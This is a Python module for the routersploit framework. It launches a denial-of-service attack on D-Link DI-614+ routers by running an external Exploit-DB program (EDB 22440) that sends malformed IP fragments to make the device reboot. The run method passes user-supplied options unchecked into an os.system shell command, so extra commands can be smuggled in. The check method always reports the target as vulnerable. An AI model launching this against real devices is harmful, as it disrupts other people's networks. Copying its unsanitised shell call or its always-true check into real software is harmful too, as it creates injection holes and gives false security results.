import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "D-Link_DI-614+-IP_Fragment_Reassembly_Denial_of_Service",

        "description": "It has been reported that the implementation of the Internet Protocol (IP) in the firmware of the D-Link DI-614+ "
                       " wireless router is vulnerable to a remotely exploitable denial of service condition. The vulnerability is related  "
                       "to the reassembly of fragmented IP packets and can be triggered by transmission of fragments with malicious size "
                       "parameters to an affected device. There is existing source code that exploits similar, older vulnerabilities that "
                       "can be used to successfully exploit this vulnerability. When exploited, the device will reboot instantly."
                       " This will result in a denial of service until the device has restarted.",

        "authors": (

            "humble",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/22440",

        ),

        "devices": (

            "D-Link, EDB-ID:22440"
        ),
    }


    target = OptIP("", "ip address")
    srcip = OptIP(""," source ip")
    src_prt = OptPort("", "source port")
    dst_prt = OptPort("", "dest port")
    num = OptString("","number to send")

    
    def run(self):

        if self.check():
            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "./exploit-db-22440 {0} {1} -s {2} -t {3} -n {4}".format(self.srcip,self.target,self.src_prt,self.dst_prt,self.num)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
